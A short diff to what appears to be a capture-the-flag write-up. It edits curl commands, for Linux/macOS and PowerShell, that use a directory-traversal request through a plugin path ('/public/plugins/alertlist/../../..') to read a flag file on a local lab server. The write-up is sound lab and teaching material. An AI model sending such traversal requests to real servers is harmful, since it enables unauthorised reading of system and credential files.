@@ -12,12 +12,12 @@ Any built-in plugin ID works. Use `alertlist` as the anchor:
 
 **Linux / macOS**
 ```sh
-curl --path-as-is "http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/ctf/flag.txt"
+curl --path-as-is "http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/ctf/flag"
 ```
 
 **Windows (PowerShell)**
 ```powershell
-curl.exe --path-as-is "http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/ctf/flag.txt"
+curl.exe --path-as-is "http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/ctf/flag"
 ```
 
 ## Flag
